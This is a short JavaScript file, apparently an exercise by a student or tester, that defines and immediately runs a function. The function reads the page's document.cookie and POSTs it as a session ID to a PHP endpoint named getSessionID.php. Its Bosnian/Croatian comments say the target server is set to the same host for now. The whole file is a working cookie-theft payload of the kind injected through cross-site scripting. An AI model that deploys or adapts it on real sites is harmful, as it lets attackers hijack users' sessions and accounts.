/**
 * Created by amer on 3/21/17.
 */

function sendSession() {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            alert(xmlhttp.responseText);
        }
    };

    var sessionID = encodeURI(document.cookie);

    var parameter = "SESSID="+sessionID;

    /*
        Ovdje definisemo na koji server saljemo AJAX zahtjev.
        Za pocetak saljem na isti server gdje obradjujem zahtjev.
     */
    xmlhttp.open("POST", "../../../getSessionID.php?"+parameter, true);
    xmlhttp.send();

}

sendSession();